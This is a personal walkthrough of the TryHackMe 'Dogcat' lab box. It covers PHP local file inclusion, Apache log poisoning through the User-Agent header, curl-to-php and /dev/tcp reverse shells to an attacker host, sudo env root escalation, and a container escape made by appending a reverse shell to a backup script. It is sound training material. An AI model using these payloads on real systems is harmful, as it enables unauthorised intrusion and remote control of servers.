## TryHackMe - [Dogcat](https://tryhackme.com/room/dogcat)
> Completed 23rd August  2022.

A web app based boxed which will test LFI via PHP and even a docker container breakout. This was to date one of the harder boxes that I have encountered specifically because I had little knowledge around Docker and containers.

---
### Environment
#### Operating System
- Latest kali-VM rolling update

#### Tools
- Nmap
- Gobuster
- Netcat
- Burpsuite
- simpleHTTPserver
- Linpeas.sh ([source](https://github.com/carlospolop/PEASS-ng))

---
### Methodology
#### Objectives/Flags
1. flag1.txt
2. flag2.txt
3. flag3.txt
4. flag4.txt

---
#### Reconnaissance
Started off by running an `nmap` scan of the target.
```bash
nmap -T4 <TargetIP>
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We can see that there is a `Apache-http` server running on port 80 we can start to enumerate.
```
http://<TargetIP>/
```
The website we find is very simplistic in design. It offers buttons which load up an image of dog or cat depending on your choice. We can see that pressing a button doesn't refresh the page but a body/div loads up a new image. By observing the source code, two directories are revealed in which hold the cat and dog images. Using `Gobuster` in the back we can confirm this and see that no other obvious directories can be enumerated. The wordlist used was `httparchive_directories_1m_2021_04_28.txt` which can be found [here](https://wordlists.assetnote.io/).
```bash
gobuster -t 100 dir -w <Wordlist> --url http://<TargetIP>/ > <Output> 
```
```
http://<TargetIP>/cats/
http://<TargetIP>/dogs/
```
A brief enumeration of these with fuzzing will reveal around 10 images in each containing their respective animals. At this point I started to crawl through the source code which didn't reveal much other than confirm that requesting a new image will replace the contents of a div in the body.
I started testing the URL for LFI by throwing in various bits of information to see how the page reacted and what type of errors I could produce.
```
http://<TargetIP>/?view=cat/
http://<TargetIP>/index.php?view=cat
http://<TargetIP>/index.php?view=cat.php
```
At this point we are given an error warning us that `cat.php.php` did not exist and could not be opened for inclusion. From this we can infer that the URI is appended with `.php` through sanitisation and that script involves an PHP include statement. I continued to enumerate.
```
http://<TargetIP>/index.php?view=bird
```
Here we are returned with an error which we can infer that the URI must contain `cat` or `dog` to pass sanitsation.
```
http://<TargetIP>/index.php?view=cat/../dog
http://<TargetIP/index.php?view=cat/../../../../var/www/html/dog
```
These attempts were successful and an output for `dog` was returned. The web app was indeed vulnerable for LFI. The URI appeared to work with a relative file path to `index.php`
```
http://<TargetIP>/index.php?view=cat/../dog/../index
```
With this attempt we are met with an error which states that we cannot redeclare values for the `containsStr()`. This function may be what's used to sanititise for `cat` or `dog`.
From here I started doing additional research into what other things I could test for in the URI. As my knowledgebase was still relatively new, I didn't have a structured process to work through and just threw whatever I could find in various cheat sheets and LFI wordlists. I tried testing various PHP parameters to substitute for `view`.
```
http://<TargetIP>/index.php?page=cat/../dog
```
I attempted using various forms of null bytes and comment-outs which appeared to drop the appended`.php` but still failed to load any images
```
http://<TargetIP>/index.php?page=cat/../dog%00
http://<TargetIP>/index.php?page=cat/../dog#
```
I threw in special characters to see how the page reacted.
```
http://<TargetIP>/index.php?page=cat/../dog!"#$%&'()*+,-./:;<=>?@[\]^_`{| }~
```
An error was output with this request, and I worked backwards to determine what symbols were affecting the script.
```
# - Comments out following
/# - Comments out leading
" - filtered to %22
' - filtered to %22
& - filtered out
% - filtered to %27
```
I started making attempts at inserting various [wordwraps](https://www.geeksforgeeks.org/protocols-and-wrapper-in-php/) into the URL which included trying to engage a reverse shell. It was revealed that RFI was not going to be possible due to the `Apache` server’s config. I had set up a `Netcat` listener prior when making attempts at sending reverse shell commands.
```bash
nc -lvnp 1234
```
```
http://<TargetIP>/index.php?page=http://google.com
  Disabled by allow_url_include=0

http://<TargetIP>/index.php?page=php://<? system('wget http://<AttackIP>:4443/php-reverse-shell.php -O /var/www/php-reverse-shell.php');?>
```
Through a cheat sheet I found the wrapping which allowed for a `base64` encoding and started attempting to see what output I got. The site would load up an encoded string which I would decode manually to see what was produced.
```
http://<TargetIP>/index.php?page=php?view=php://filter/convert.base64-encode/resource=cat/../dog
```
```html 
  <img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
```
I was surprised to find that instead of an image file path, a script was returned from what assumed was the `dog.php`. A similar type of response was found when testing cat. I decided to go with this and try and find a way to return the main script from `index.php` as it will be the best chance I have to gain a foothold into the server.
```
http://<TargetIP>/index.php?page=php?view=php://filter/convert.base64-encode/resource=cat/../dog/../../../../var/www/html/index
```
```php
<?php
  function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;}
  $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
  if(isset($_GET['view'])) {
    if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
      echo 'Here you go!';
      Warning: passthru(): Cannot execute a blank command in /var/log/apacinclude $_GET['view'] . $ext;
    } else {
      echo 'Sorry, only dogs or cats are allowed.';
      }
    }
?>
```
I had successfully managed to extract the PHP script of the homepage. From here I started reading up on PHP functions and statements to try and reverse engineer the script.
Firstly, a function is run:
```php
containsStr($str, $substr) - Searches for string $substr in $str
```
If true, returns:
```php
strpos($str, $substr) - String position of $subtr in $str
```
Output is put against:
```php
!== false - Checks if output is not equal or identical to 'false'
```
After the function is run, a variable is defined:
```php
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php' - $ext is defined as URI which is set to '.php'
```
Next an IF statment is ran:
```php
if(isset($_GET['view'])) - Checks if 'view' is used in the URI?
```
If TRUE, the following IF statument is run:
```php
{if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) - Checks to see if 'dog' or 'cat' is used with the 'view' URI
```
If this statment is TRUE, the following is ran
```php
{echo 'Here you go!'; Warning: passthru(): Cannot execute a blank command in /var/log/apacinclude $_GET['view'] . $ext;} - Returns an output, which has been left blank due to way the script was found.
```
If `dog` or `cat` was not used with the `view` URI, the following is run.
```php    
else {echo 'Sorry, only dogs or cats are allowed.';}}
```
From this breakdown we can see that both `view` and `ext` have been created as variables. `ext` is set as `.php` which we know is appended to the end. `view` is sanitised to check if either `cat` or `dog` is used in the URI.
After better understanding the PHP script that's used on the homepage I attempt to mess with the variables and see what happens.
```
http://<TargetIP>/index.php?view=cat/../dog$ext=.php
http://<TargetIP>/index.php?view=cat/../dog.php$ext=
```
These URLs successfully load images to the page letting us know how we can bypass the sanitsation. I put this to the test by aiming straight for `/etc/passwd`.
```
http://<TargetIP>/index.php?view=cat/../../../../etc/passwd&ext=
```
Success. The file is loaded into the page and shown to us.
```
!root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin b
in:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin s
ync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats
Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```
We can observe that no usernames of interest are returned to us and that most of these system accounts don't allow logins (`/nologin`). The `x`'s indicate that an encrypted password is stored in the `/etc/shadow` file ([source](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/)). Using the sanitsation bypass I continue to enumerate files of interest. 
```bash
ls /var/www
  flag2_QMW7JvaY2LvK.txt
cat flag2_QMW7JvaY2LvK.txt
  THM{***}
```
The second flag was found as I walked the file path.

Eventually, I found the Apache server's log file `/var/log/apache2/access.log`. Here I could see the GET requests that were being made to the server. It was at this point I had the idea to use the log file to gain a foothold into the server.

Inspired by how I had previously understood about the late 2021 log4j vulnerability, I would attempt to remotely execute code on the server by poisoning the logs. I started to test for methods I would do this by using the `Burpsuite` repeater. While the same methods could be achieved with `Curl`, I didn't have a lot of practice to do this via trial and error. A brief google search on log poisoning suggested injecting code into the user-agent field as this was a section that wouldn't affect the URL/URI format but also be recorded in the log file by default. I found a PHP based script to insert into which uses the same format as the original script, allowing us to create a new variable to define in the URI. I first tested this method using `ls`.
```
Host: <TargetIP>
User-Agent: Mozilla/5.0 <?php passthru($_GET['cmd']); ?> Gecko/20100101 Firefox/69.0
  	/index.php?view=dog/../../../../var/log/apache2/access.log&cmd=ls&ext= HTTP/1.1" 408 0 "-" "Mozilla/5.0
```
We can confirm the RCE is successful by finding the output of `ls` displayed in the log file. We could now prepare a reverse shell command to exploit the vulnerable log file and gain a foothold (Spaces in commands could be substituted using `+`).

#### Weaponization 
N/A

#### Delivery
N/A

#### Exploitation
From here I proceeded to set up a listener and send through a command which would execute a PHP reverse shell file from my HTTP server. I had earlier tested to find that `Curl` ran correctly and knew that PHP was installed on the system due to how the web application was running.
```bash
nc -lvnp 1234
curl http://<AttackIP>:4443<php-reverse-shell.php> | php
```
I had now gained shell access as the web application user.
```bash
id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

>Edit: As I was writing up this report, I had realised that my further steps of finding a method for privesc could have been achieved by only enumerating through the poisoned logs. For the sake of trying to understand how to maintain a smaller footprint, I will comment later how I should have proceeded prior to gaining shell access.

Using a checklist, I continued to enumerate system files, seeing what I did and didn't have access to as the `www-data` user.
```bash
find / -perm -u=s -type f 2>/dev/null
  /bin/su
  /bin/umount
  /usr/bin/chfn
  /usr/bin/newgrp
  /usr/bin/passwd
  /usr/bin/chsh
  /usr/bin/env
  /usr/bin/gpasswd
  /usr/bin/sudo
```
```bash
sudo -l                                                                                                             
  Matching Defaults entries for www-data on a2a87b1f25bc:                                                             
    env_reset, mail_badpass,                                                                                        
  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

  User www-data may run the following commands on a2a87b1f25bc:                                                       
    (root) NOPASSWD: /usr/bin/env     
```
Use of the `sudo` command revealed a big find for me. I've not made use of the `env` binary a lot in past CTFs. A [google search](https://linuxize.com/post/how-to-set-and-list-environment-variables-in-linux/) revealed that this file controlled `environmental variable` paths and according to [GTFOBins](https://gtfobins.github.io/gtfobins/env/), it could be used to escalate privileges.
```bash
sudo env /bin/bash
  id
    uid=0(root) gid=0(root) groups=0(root)
```
Success, we have managed to escalate to the `root` user through a misconfiguration.

>Edit: It was after the fact I realised that I could have originally gained root access through my original shell with use of the following command if I had further enumerated for this information (& should be encoded as %26).
```bash
sudo env /bin/bash -c 'bash -i >& /dev/tcp/<AttackIP>/1234 0>&1'
  id
    uid=0(root) gid=0(root) groups=0(root)
```

#### Installation 
N/A

#### Command & Control
N/A

#### Actions on Objective
With root access I started my search for loot.
```bash
ls /root
  flag3.txt
cat flag3.txt
    THM{***}
```
I'd found a flag in the `root` user's files however being that there was 4 in total, and I had only found the 3rd at this point, I took this as sign that there was a higher level to get to.
```bash
ls -la /
  -rwxr-xr-x   1 root root    0 Aug 23 23:29 .dockerenv
```
This was a file I had never seen before. I understood this as a part of the `Docker` application which hinted at the idea that the web application was running inside a docker container. This was also aided by the fact that we found an SSH service running on the IP address by no SSH server application appeared to be installed/running.
This was the first time I was dealing with containers, but I understood that I'd need to find a way to break out of the container to reach the true host system. As I searched the file system further, I found little to no references to `Docker` other than miscellaneous directories.

I spent a good amount of time trying container escape techniques I'd found online which would end up not being applicable to this target environment.
I dabbled with script base vulnerability scanners such as `CDK` and `Deepce`. While using `Linpeas`, I had spent some time reading through it's findings and eventually investigated the files of interest in the `/opt/` directory.
```bash
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 2949120 Aug 23 02:22 /opt/backups/backup.tar                                                                                                                                                                         
-rwxr--r-- 1 root root 69 Mar 10  2020 /opt/backups/backup.sh
```
Originally, I had glossed over these files and made the mistake of presuming that they were nothing but miscellaneous files. but and additional output of the scanner found that the script was run recently.
```bash
strings /opt/backups/backups.tar
  RUN echo "THM{***}" > /root/flag3.txt
  RUN echo "THM{***}" > /var/www/flag2_QMW7JvaY2LvK.txt
  $flag_1 = "THM{***}"
  (References to .git)
  (References to Docker)
```
```
cat /opt/backups/backups.sh
  tar cf /root/container/backup/backup.tar /root/container
```
After reviewing these files, `backup.sh` caught my attention as it appeared to refer to a container file that didn't exist inside the web-application container. After some further reading into what this could mean, I had a hunch that this file or directory was being shared with the true host. Thinking that if this script was run periodically, by inserting a reverse shell into it I may be able to gain a reverse shell rather than breaking out of the container with the existing shells running.
```bash
echo "bash -i >& /dev/tcp/<AttackIP>/1235 0>&1" >> backup.sh
```
I left a new listener running and waited. After 5-10 minutes the listener picked up a connection and a shell was opened as `root@dogcat`.
```bash
id
  uid=0(root) gid=0(root) groups=0(root)
```
I had made it onto the true host and could see the shared container file. I searched for more loot and had finally found the last flag. The box was completed.
```bash
ls
  container
  flag4.txt
cat flag4.txt
  THM{***}
```

---
### After-action
#### What I've learned
This was a challenging box to work through, specifically testing LFI which had taken a few days’ worth of researching and trial and error but after throwing enough spaghetti at the wall, I had found what sticks. I left with a better understand into how PHP would work and how it can be exploited and how a smaller footprint could be achieved without aiming for shell access immediately. Enumeration was so important in this box, especially when it came to finding ways to escape the container. I need to be sure not to overlook files under the impression that they're just miscellaneous.

#### What I would've done differently

I would have spent more time enumerating using the poisoned log file, I believe it would give you a smaller footprint to explore the targets file system and give you a better idea of how the `root` user could be accessed or even how a container could be escaped without even landing a reverse shell.